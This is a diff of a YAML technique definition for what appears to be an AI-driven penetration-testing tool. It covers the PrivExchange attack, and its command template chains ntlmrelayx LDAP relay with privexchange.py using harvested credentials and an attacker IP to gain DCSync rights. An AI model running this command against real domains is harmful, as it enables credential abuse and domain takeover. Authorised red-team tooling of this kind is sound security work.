@@ -1,6 +1,6 @@
 name: privexchange
 category: ad
-description: PrivExchange — Exchange PushSubscription coerces EWS auth for LDAP relay
+description: "PrivExchange \u2014 Exchange PushSubscription coerces EWS auth for LDAP relay"
 preconditions:
 - has_cred
 - service.port==443
@@ -11,8 +11,8 @@ parameters:
   domain: from_engagement.domain
   username: from_cred.username
   password: from_cred.password
-command_template: ntlmrelayx.py -t ldap://{dc_ip} --escalate-user {username} & python3
-  privexchange.py -ah {attacker_ip} -u {username} -p '{password}' -d {domain} {exchange_url}
+command_template: ntlmrelayx.py -t ldap://{dc_ip} --escalate-user {username} & python3 privexchange.py -ah {attacker_ip} -u
+  {username} -p '{password}' -d {domain} {exchange_url}
 parser: generic_parser
 expected_effects:
 - exchange_machine_coerced
@@ -23,16 +23,13 @@ falsifier:
   pattern: 401|403|patched|EPA|PushSubscription unavailable
   timeout: 300
 model_tier: sonnet
-mechanism: 'Pre-CU-patch Exchange Server had WriteDACL on domain root by default (Exchange
-
-  Trusted Subsystem). Its EWS PushSubscription feature authenticates outbound to
-
-  any URL the subscriber names. Trick it into authenticating to ntlmrelayx,
-
-  relay to LDAP → add DCSync rights to the operator.
-
-  '
+mechanism: "Pre-CU-patch Exchange Server had WriteDACL on domain root by default (Exchange\nTrusted Subsystem). Its EWS PushSubscription\
+  \ feature authenticates outbound to\nany URL the subscriber names. Trick it into authenticating to ntlmrelayx,\nrelay to\
+  \ LDAP \u2192 add DCSync rights to the operator.\n"
 references:
-  ocd_mindmap: 'Branch 1: PrivExchange (Exchange → LDAP relay)'
+  ocd_mindmap: "Branch 1: PrivExchange (Exchange \u2192 LDAP relay)"
   hacktricks: windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges.md
+  ocd_mindmap_node_ids:
+  - 389c58f7d2
+  - f5d37246b3
 hacktricks_ref: windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
